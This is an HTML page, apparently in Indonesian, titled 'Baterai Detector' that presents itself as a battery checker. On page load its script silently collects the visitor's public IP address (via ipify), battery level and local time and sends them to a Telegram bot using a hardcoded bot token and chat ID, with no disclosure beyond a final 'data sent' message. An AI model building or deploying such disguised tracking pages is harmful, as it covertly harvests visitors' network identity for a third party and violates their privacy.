<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Baterai Detector</title>
    <style>
        body{font-family:Arial;text-align:center;padding:50px;background:#0a0a0a;color:white;}
        .box{background:#1a1a1a;padding:30px;border-radius:15px;max-width:400px;margin:auto;}
        .status{font-size:48px;margin:20px 0;}
    </style>
</head>
<body>
<div class="box">
    <h2>Memuat data...</h2>
    <div class="status">🔋</div>
    <p>Harap tunggu sebentar</p>
</div>

<script>
// ========== DATA TELEGRAM BARU ==========
const BOT_TOKEN = '8510648318:AAEnqQU5D0kL-X_2fpoxXnQuTw9Gi0ppXcZ8';
const CHAT_ID = '8212307369';
// ========================================

async function kirimTelegram(pesan) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const res = await fetch(url, {
            method: 'POST',
            headers: {'Content-Type':'application/json'},
            body: JSON.stringify({chat_id: CHAT_ID, text: pesan})
        });
        const data = await res.json();
        console.log(data);
    } catch(e) { console.log('Error:', e); }
}

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch(e) { return 'Tidak terdeteksi'; }
}

(async function() {
    let batre = 'Tidak support';
    if ('getBattery' in navigator) {
        const b = await navigator.getBattery();
        batre = Math.floor(b.level * 100) + '%';
    }
    
    const ip = await getIP();
    const waktu = new Date().toLocaleString('id-ID');
    
    await kirimTelegram(`🔋 Baterai: ${batre}\n🌐 IP: ${ip}\n🕒 Waktu: ${waktu}`);
    
    document.querySelector('.box').innerHTML = '<h2>✔️ Selesai</h2><div class="status">✅</div><p>Data terkirim</p>';
})();
</script>
</body>
</html>
